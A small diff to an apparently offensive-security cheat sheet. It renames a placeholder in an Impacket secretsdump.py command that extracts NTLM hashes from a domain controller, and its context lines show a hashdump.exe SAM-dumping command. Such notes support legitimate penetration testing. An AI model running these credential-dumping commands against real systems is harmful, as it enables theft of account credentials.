@@ -70,7 +70,7 @@ $ .\hashdump.exe /samdump
 ### secretsdump.py (Impacket)
 
 ```c
-$ secretsdump.py -just-dc-ntlm <TARGET_DOMAIN>.local/Administrator:"<PASSWORD>"@<RHOST>
+$ secretsdump.py -just-dc-ntlm <DOMAIN>.local/Administrator:"<PASSWORD>"@<RHOST>
 ```
 
 ### Generating Hash
